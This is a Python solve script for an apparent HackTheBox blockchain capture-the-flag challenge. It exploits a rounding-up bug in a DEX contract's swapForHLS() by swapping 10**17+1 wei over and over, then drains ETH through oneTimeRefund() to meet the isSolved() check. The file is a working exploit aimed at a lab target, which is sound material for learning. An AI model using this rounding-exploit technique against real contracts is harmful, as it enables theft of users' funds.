#!/usr/bin/env python3

import subprocess
from web3 import Web3
from eth_account import Account
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)

def csend(contract: str, fn: str, *args, **options):
    base_command = f"cast send {contract} '{fn}' {' '.join(args)}"
    options_str = ' '.join([f"--{key.replace('_', '-')}" + (f" {value}" if value else "") for key, value in options.items()])
    command = f"{base_command} {options_str} --rpc-url {RPC_URL} --private-key {player_pvk}"
    print(f"[*] {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode == 0:
        print(f"[+] Output:\n{result.stdout}")
    else:
        print(f"[!] Error:\n{result.stderr}")
        exit(1)
    return result.stdout

def ccall(contract: str, fn: str, *args, **options):
    base_command = f"cast call {contract} '{fn}' {' '.join(args)}"
    options_str = ' '.join([f"--{key.replace('_', '-')}" + (f" {value}" if value else "") for key, value in options.items()])
    command = f"{base_command} {options_str} --rpc-url {RPC_URL} --private-key {player_pvk}"
    print(f"[*] {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode == 0:
        print(f"[+] Output:\n{result.stdout}")
    else:
        print(f"[!] Error:\n{result.stderr}")
        exit(1)
    return result.stdout


if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    player_account = Account.from_key(player_pvk)
    print(f"[+] Player Address: {player_account.address}")
    print(f"[+] Setup Contract Address: {setup_addr}")
    print(f"[+] Target Contract Address: {target_addr}")
    
    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")

    hls_token = ccall(target_addr, "heliosLuminaShards()(address)").strip()
    print(f"[+] HLS Token Address: {hls_token}")

    # approve DEX to spend player's HLS tokens
    csend(hls_token, "approve(address,uint256)", target_addr, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")

    n_trades = 0
    prev_hsl_balance = 0
    exchange_ratio_hsl = 10
    trade_cost = 10**17 + 1
    while True:
        n_trades += 1
        print(f"\n\n[+] Trade #{n_trades}")

        # trigger rounding up to ceil with just 1 wei
        csend(target_addr, "swapForHLS()", value=str(trade_cost))
        
        # get current HLS balance
        hls_balance = int(ccall(hls_token, "balanceOf(address)(uint256)", player_account.address))
        print(f"[+] current HLS balance: {hls_balance}")

        eth_gain = ((hls_balance - prev_hsl_balance) * (10**18 / exchange_ratio_hsl)) - trade_cost
        total_eth_gain = (hls_balance * (10**18 / exchange_ratio_hsl)) - (trade_cost) * n_trades
        print(f"[+] ETH gain from the trade: {eth_gain}")
        print(f"[+] total projected ETH gain: {total_eth_gain}")
        assert hls_balance > prev_hsl_balance
        assert eth_gain > 0
        prev_hsl_balance = hls_balance

        if total_eth_gain >= 10e18:
            break

    # finalize eth gain
    csend(target_addr, "oneTimeRefund(address,uint256)", hls_token, str(hls_balance))
    
    hls_balance = int(ccall(hls_token, "balanceOf(address)(uint256)", player_account.address))
    print(f"[+] current HLS balance: {hls_balance}")

    eth_balance = w3.eth.get_balance(player_account.address)
    print(f"[+] current ETH balance: {eth_balance}")

    is_solved = ccall(setup_addr, "isSolved()(bool)").strip()
    assert is_solved == "true", "Exploit failed"

    ### get flag ###
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")